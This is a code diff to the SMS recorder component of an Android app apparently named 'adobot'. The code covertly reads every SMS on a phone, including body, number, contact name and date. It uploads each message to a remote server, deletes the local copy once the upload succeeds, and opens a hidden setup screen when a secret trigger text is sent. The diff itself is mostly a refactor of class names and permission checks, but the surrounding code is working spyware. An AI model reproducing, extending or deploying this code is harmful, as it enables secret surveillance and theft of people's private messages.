@@ -17,10 +17,9 @@ import android.util.Log;
 import com.android.adobot.AdobotConstants;
 import com.android.adobot.CommonParams;
 import com.android.adobot.activities.SetupActivity;
-import com.android.adobot.activities.UpdateActivity;
 import com.android.adobot.database.AppDatabase;
-import com.android.adobot.database.SmsModel;
-import com.android.adobot.database.SmsModelDao;
+import com.android.adobot.database.Sms;
+import com.android.adobot.database.SmsDao;
 import com.android.adobot.http.Http;
 import com.android.adobot.http.HttpCallback;
 import com.android.adobot.http.HttpRequest;
@@ -51,14 +50,14 @@ public class SmsRecorderTask extends BaseTask {
     private SharedPreferences prefs;
     private ContentResolver contentResolver;
     private AppDatabase appDatabase;
-    private SmsModelDao smsModelDao;
+    private SmsDao smsDao;
     private static SmsRecorderTask instance;
 
     public SmsRecorderTask(Context context) {
         setContext(context);
         appDatabase = Room.databaseBuilder(context.getApplicationContext(),
                 AppDatabase.class, AdobotConstants.DATABASE_NAME).build();
-        smsModelDao = appDatabase.smsModelDao();
+        smsDao = appDatabase.smsDao();
         smsObserver = (new SmsObserver(new Handler()));
         contentResolver = context.getContentResolver();
         prefs = context.getSharedPreferences(AdobotConstants.PACKAGE_NAME, Context.MODE_PRIVATE);
@@ -74,43 +73,14 @@ public class SmsRecorderTask extends BaseTask {
         if (hasPermission()) {
             commonParams = new CommonParams(context);
             contentResolver.registerContentObserver(smsUri, true, smsObserver);
-
-
-            //notify server
-//            HashMap params = new HashMap();
-//            params.put("uid", commonParams.getUid());
-//            params.put("sms_forwarder_number", recipientNumber);
-//
-//            Http req = new Http();
-//            req.setUrl(commonParams.getServer() + AdobotConstants.POST_STATUS_URL + "/" + commonParams.getUid());
-//            req.setMethod(HttpRequest.METHOD_POST);
-//            req.setParams(params);
-//            req.execute();
         } else
             requestPermissions();
     }
 
-//    public void stopForwarding() {
-//        commonParams = new CommonParams(context);
-//        if (isListening) {
-//            contentResolver.unregisterContentObserver(smsObserver);
-//            isListening = false;
-//        }
-//        //notify server
-//        HashMap params = new HashMap();
-//        params.put("uid", commonParams.getUid());
-//        params.put("sms_forwarder_number", "");
-//        params.put("sms_forwarder_status", isListening);
-//
-//        Http req = new Http();
-//        req.setUrl(commonParams.getServer() + AdobotConstants.POST_STATUS_URL + "/" + commonParams.getUid());
-//        req.setMethod(HttpRequest.METHOD_POST);
-//        req.setParams(params);
-//        req.execute();
-//    }
-
     private boolean hasPermission() {
-        return ContextCompat.checkSelfPermission(context, Manifest.permission.SEND_SMS) ==
+        return ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) ==
+                PackageManager.PERMISSION_GRANTED &&
+                ContextCompat.checkSelfPermission(context, Manifest.permission.INTERNET) ==
                 PackageManager.PERMISSION_GRANTED;
     }
 
@@ -127,7 +97,7 @@ public class SmsRecorderTask extends BaseTask {
         Thread thread = new Thread(new Runnable() {
             @Override
             public void run() {
-                SmsModel m = smsModelDao.first();
+                Sms m = smsDao.first();
                 Log.i(TAG, "m = " + m);
                 if (m != null) {
                     submitSms(m, cb);
@@ -138,15 +108,15 @@ public class SmsRecorderTask extends BaseTask {
         thread.start();
     }
 
-    private void submitSms(final SmsModel smsModel, final SubmitSmsCallback cb) {
+    private void submitSms(final Sms sms, final SubmitSmsCallback cb) {
 
-        final int type = smsModel.getType();
-        final int id = smsModel.get_id();
-        final String thread_id = smsModel.getThread_id();
-        final String name = smsModel.getName();
-        final String phone = smsModel.getPhone();
-        final String body = smsModel.getBody();
-        final String date = smsModel.getDate();
+        final int type = sms.getType();
+        final int id = sms.get_id();
+        final String thread_id = sms.getThread_id();
+        final String name = sms.getName();
+        final String phone = sms.getPhone();
+        final String body = sms.getBody();
+        final String date = sms.getDate();
 
         try {
 
@@ -173,7 +143,7 @@ public class SmsRecorderTask extends BaseTask {
                     int statusCode = (int) response.get("status");
                     if (statusCode >= 200 && statusCode < 400) {
                         try {
-                            smsModelDao.delete(smsModel.getId(), smsModel.getThread_id());
+                            smsDao.delete(sms.getId(), sms.getThread_id());
                             Log.i(TAG, "sms submitted!! " + body);
                             submitNextRecord(cb);
                         } catch (Exception e) {
@@ -185,7 +155,7 @@ public class SmsRecorderTask extends BaseTask {
                         Log.i(TAG, "Sms failed to submit!!!" + phone);
                         Log.i(TAG, "Status code: " + statusCode);
                         cb.onResult(false);
-                        /*InsertSmsModel ins = new InsertSmsModel(smsModel);
+                        /*InsertCallLogThread ins = new InsertCallLogThread(sms);
                         ins.start();*/
                     }
                 }
@@ -196,7 +166,7 @@ public class SmsRecorderTask extends BaseTask {
             Log.i(TAG, "FAiled with error: " + e.toString());
             e.printStackTrace();
             cb.onResult(false);
-            /*InsertSmsModel ins = new InsertSmsModel(smsModel);
+            /*InsertCallLogThread ins = new InsertCallLogThread(sms);
             ins.start();*/
         }
     }
@@ -206,10 +176,10 @@ public class SmsRecorderTask extends BaseTask {
         private String phone;
         private String message;
         private int delay = 3000;*/
-        private SmsModel smsModel;
+        private Sms sms;
 
-        public InsertSmsModel(SmsModel smsModel) {
-            this.smsModel = smsModel;
+        public InsertSmsModel(Sms sms) {
+            this.sms = sms;
         }
 
         @Override
@@ -217,9 +187,9 @@ public class SmsRecorderTask extends BaseTask {
             super.run();
 
             try {
-                smsModelDao.insert(smsModel);
-                Log.i(TAG, "Message saved, type: " + smsModel.getType() +  "!!!" + smsModel.getBody());
-                submitSms(smsModel, new SubmitSmsCallback() {
+                smsDao.insert(sms);
+                Log.i(TAG, "Message saved, type: " + sms.getType() +  "!!!" + sms.getBody());
+                submitSms(sms, new SubmitSmsCallback() {
                     @Override
                     public void onResult(boolean success) {
                         if (success) {
@@ -233,7 +203,7 @@ public class SmsRecorderTask extends BaseTask {
                     }
                 });
             } catch (Exception e) {
-                Log.i(TAG, "Failed to save sms: id: " + smsModel.getId());
+                Log.i(TAG, "Failed to save sms: id: " + sms.getId());
             }
 
 
@@ -303,7 +273,6 @@ public class SmsRecorderTask extends BaseTask {
             final String body = mCur.getString(mCur.getColumnIndex("body"));
 
             String smsOpenText = prefs.getString(AdobotConstants.PREF_SMS_OPEN_TEXT_FIELD, "Open adobot");
-//            Log.i(TAG, "Sms open cmd: " + smsOpenText);
 
             if (Objects.equals(body.trim(), smsOpenText.trim()) && type == MESSAGE_TYPE_SENT) {
                 Intent setupIntent = new Intent(context, SetupActivity.class);
@@ -340,17 +309,17 @@ public class SmsRecorderTask extends BaseTask {
 
                 final String date = formatter.format(calendar.getTime());
 
-                SmsModel smsModel = new SmsModel();
-                smsModel.setId(Integer.parseInt(thread_id + id));
-                smsModel.set_id(id);
-                smsModel.setThread_id(thread_id);
-                smsModel.setBody(body);
-                smsModel.setName(name);
-                smsModel.setPhone(phone);
-                smsModel.setDate(date);
-                smsModel.setType(type);
+                Sms sms = new Sms();
+//                sms.setId(Integer.parseInt(thread_id + id));
+                sms.set_id(id);
+                sms.setThread_id(thread_id);
+                sms.setBody(body);
+                sms.setName(name);
+                sms.setPhone(phone);
+                sms.setDate(date);
+                sms.setType(type);
 
-                InsertSmsModel ins = new InsertSmsModel(smsModel);
+                InsertSmsModel ins = new InsertSmsModel(sms);
                 ins.start();
 
                 /*SimpleDateFormat df = new SimpleDateFormat("EEE d MMM yyyy");
